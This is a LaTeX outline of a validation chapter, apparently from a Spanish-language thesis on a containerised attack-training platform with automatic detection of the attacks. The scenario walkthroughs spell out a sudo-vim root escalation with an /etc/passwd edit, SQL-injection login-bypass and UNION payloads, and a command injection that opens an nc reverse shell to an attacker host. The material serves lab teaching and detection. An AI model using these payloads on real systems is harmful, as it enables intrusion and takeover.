\chapter{Validación}
\section{Evaluación}

% ===========================================================================
% BOSQUEJO DE TRABAJO — Por desarrollar a medida que se realicen pruebas
% reales del sistema (CLCERT, red DCC, escenarios multi-estudiante, etc.).
%
% Las secciones 5.1 a 5.3 se podrían añadir ya: los tres escenarios están
% funcionando en el repo y los walkthroughs ya están redactados en el README
% del repositorio público.
%
% Las secciones 5.4 y 5.5 dependen de pruebas que aún faltan.
% ===========================================================================

% ---------------------------------------------------------------------------
% 5.1 Metodología y criterios de validación
% ---------------------------------------------------------------------------
% - Recordar el criterio declarado en el Capítulo 1: validación automática
%   para al menos tres categorías entre web / database / pwning / forensics /
%   reversing, sin necesidad de flags manuales.
% - Describir cómo se valida cada escenario: setup (imagen y configuración),
%   ejecución del exploit por parte del estudiante, targets esperados,
%   targets disparados, evidencia capturada (panel SSH, output del REPL).
% - Aclarar que la validación opera en dos niveles:
%     (a) los escenarios funcionan y disparan los targets de forma correcta;
%     (b) el sistema se sostiene bajo uso realista — pruebas pendientes.

% ---------------------------------------------------------------------------
% 5.2 Cobertura del criterio de éxito
% ---------------------------------------------------------------------------
% - Tabla resumen con los tres escenarios:
%     columna 1: escenario
%     columna 2: categoría (privesc, sqli, network)
%     columna 3: monitores involucrados (FS, Proc, Log, Red)
%     columna 4: tipos de target ejercitados
% - Mostrar que entre los tres se cubren los cuatro monitores y los nodos
%   lógicos (al menos un escenario con and / or si aplica).
% - Conectar con el objetivo declarado: "al menos tres categorías".

% ---------------------------------------------------------------------------
% 5.3 Escenarios validados
% ---------------------------------------------------------------------------

% \subsection{Privilege Escalation vía sudo vim (pwning)}
%   - Setup: imagen flexipwn/vuln-sudo (sshd + sudo NOPASSWD vim).
%   - Walkthrough del estudiante:
%       ssh student-XXXXXX@host -p PORT       (al atacante)
%       ssh ctfuser@flexipwn-<env>-vulnerable  (al vulnerable)
%       sudo -l                                (descubre el privilegio)
%       sudo vim -c ':!bash'                   (escalada)
%       echo "pwned" > /root/flag.txt          (evidencia)
%       echo "..." >> /etc/passwd              (modificación)
%   - Targets disparados:
%       file_created /root/*.txt
%       file_modified /etc/passwd
%       process_running euid=0 cmd=bash ancestor_contains=sudo
%   - Salida esperada del REPL del educador.

% \subsection{SQL Injection Login Bypass (web)}
%   - Setup: imagen flexipwn/vuln-sqli-mysql (Flask + MySQL en :5001, general_log on).
%   - Walkthrough del estudiante:
%       payload 1: admin' OR '1'='1' --        (bypass clásico)
%       payload 2: UNION SELECT ... FROM sensitive_data --  (extracción)
%   - Targets disparados (mezcla log_pattern + network_payload con
%     capture_filter "port 3306"):
%       log_pattern OR.*1.*=.*1
%       log_pattern authentication_success
%       log_pattern SELECT.*sensitive_data
%       network_payload OR.*1.*=.*1
%       network_payload FLAG{sql_injection_detected}
%   - Discutir cómo logs y red se refuerzan: el mismo payload activa varios
%     targets por canales independientes.

% \subsection{Command Injection -> Reverse Shell (network)}
%   - Setup: imagen flexipwn/vuln-command-injection (Flask /ping?host= + nc).
%   - Walkthrough del estudiante (necesita dos sesiones SSH al atacante):
%       Terminal A: nc -lvp 4444
%       Terminal B: curl ".../ping?host=;nc <attacker> 4444 -e /bin/bash"
%       Terminal A (ya con la reverse shell): echo "owned" > /root/win.txt
%   - Targets disparados:
%       network_connection dst_port=4444
%       file_created /root/*.txt
%   - Nota: este escenario justifica el sidecar tcpdump (Capa 2) y la red
%     externa atacante-host (Capa 1).

% ---------------------------------------------------------------------------
% 5.4 Pruebas de robustez del sistema  — PENDIENTES
% ---------------------------------------------------------------------------
% Cada uno requiere ejecutar la prueba y registrar el resultado:
%
% - Manejo de YAML malformado: validar que Pydantic devuelve un mensaje claro
%   identificando el campo problemático sin ejecutar el sistema.
% - Manejo de contenedor caído a mitad del run: verificar que on_stopped lleva
%   al estado failed o stopped correctamente, y que el daemon no queda colgado.
% - Manejo de participante duplicado / username repetido.
% - Manejo de scenario id no encontrado en run start.
% - Pruebas de batch-start con N estudiantes simultáneos (aula completa):
%   contar timeouts, fallos por límite de puertos del rango 2200-2299,
%   contención de la base SQLite.
% - Tiempo de detección desde el evento (acción del estudiante) hasta la
%   alerta visible en el REPL del educador. Medir gap real de polling.
% - "Trampa" en tcpdump: enviar un payload SQLi por fuera del flujo normal del
%   escenario (por ejemplo, desde una terminal del host atacante con curl
%   directo) y verificar que el monitor de red lo detecta igualmente.
% - run reset: verificar que el env_id cambia, que el ExerciseRun se preserva,
%   que los TargetResult del intento previo quedan con reset_at, y que el
%   nuevo intento empieza limpio.
% - exit/Ctrl+D en cliente attached vs daemon stop: comprobar la separación.

% ---------------------------------------------------------------------------
% 5.5 Pruebas en infraestructura real  — PENDIENTES
% ---------------------------------------------------------------------------
% - Despliegue en servidor del CLCERT.
% - Exposición controlada a la red del DCC / la universidad.
% - Pruebas de aislamiento entre estudiantes:
%     un estudiante intenta resolver hostnames del entorno de otro
%     un estudiante intenta egresar al host
%     un estudiante intenta llegar al daemon FlexiPwn
% - Pruebas de escape de contenedor (al menos un par de técnicas conocidas):
%   verificar que el modo rootless contiene el escape como se afirmó en
%   el Capítulo de Implementación.
% - Sesión piloto con un grupo de estudiantes reales (si se llega a alcanzar):
%   medir UX, tiempos de onboarding, fricciones del flujo educador-estudiante.

% ---------------------------------------------------------------------------
% 5.6 Discusión  (cierre del capítulo)
% ---------------------------------------------------------------------------
% - Qué demuestran los tres escenarios respecto al criterio del Capítulo 1.
% - Qué queda como pendiente y cuál es su impacto.
% - Hilo con el Capítulo de Conclusión: trabajo futuro y reflexión final.
